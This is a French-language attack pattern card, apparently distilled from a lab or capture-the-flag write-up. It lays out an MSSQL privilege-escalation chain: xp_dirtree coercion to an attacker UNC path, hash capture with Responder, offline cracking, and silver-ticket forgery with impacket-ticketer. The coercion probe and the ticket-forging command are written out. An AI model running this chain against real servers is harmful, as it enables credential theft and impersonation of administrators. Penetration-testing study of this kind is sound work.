---
doc_kind: pattern
title: "Silver ticket pour SPN MSSQL via coercition xp_dirtree"
category: misc
slug: fullhouse-mssql-ntlm-relay-silver-ticket
created: 2026-10-29
status: active
tags:
  - xp_dirtree
  - ntlm-coercion
  - silver-ticket
  - mssql-relay
  - xp_cmdshell-potato
chain_summary: "xp_dirtree vers un chemin UNC coerce le compte de service SQL a s'authentifier (capturable par Responder); son hash NTLM casse permet de forger un silver ticket pour le SPN MSSQL et impersonner n'importe quel utilisateur dans l'app, sans acces DC."
---
# Silver ticket pour SPN MSSQL via coercition xp_dirtree

## Chain Summary

- One-line chain: xp_dirtree vers un chemin UNC coerce le compte de service SQL a s'authentifier (capturable par Responder); son hash NTLM casse permet de forger un silver ticket pour le SPN MSSQL et impersonner n'importe quel utilisateur dans l'app, sans acces DC.
- Typical target shape: Acces a une instance MSSQL (meme avec un compte limite ayant le droit d'executer xp_dirtree); position pour capturer/relayer l'authentification resultante (Responder).

## Preconditions

- Acces a une instance MSSQL (meme avec un compte limite ayant le droit d'executer xp_dirtree); position pour capturer/relayer l'authentification resultante (Responder).

## Cheap Probes

- Tenter EXEC xp_dirtree '\\<attacker-ip>\share' et verifier si une authentification est recue sur un listener Responder.

## Telltale Evidence

- Responder capture une requete d'authentification NetNTLMv2 provenant du compte de service SQL.

## Escalation Order

1. Executer xp_dirtree vers un chemin UNC controle par l'attaquant.
2. Capturer le hash NetNTLMv2 resultant via Responder.
3. Casser le hash offline pour obtenir le NTLM du compte de service.
4. Forger un silver ticket pour le SPN MSSQL avec ce NTLM + SID domaine via impacket-ticketer.
5. Se connecter a l'instance MSSQL avec ce ticket pour impersonner l'utilisateur cible.

## Common Mistakes

- Chercher a casser directement le mot de passe du compte Administrator au lieu de forger un silver ticket qui ne necessite que le hash NTLM d'un compte de service moins privilegie.

## Payload Shapes

```text
EXEC master..xp_dirtree '\\<attacker>\x'  puis  impacket-ticketer -nthash <ntlm> -domain-sid <sid> -spn MSSQLSvc/<host>:1433 Administrator
```

## Related Writeups

- fullhouse-mssql-ntlm-relay-silver-ticket

## Skill Impact

- Related skill: pwn-triage/AD: ajouter xp_dirtree -> coercition -> silver ticket SPN comme chaine de privesc MSSQL sans acces DC.
- Rule to add or update: (backlog only for now; promote if this pattern repeats)
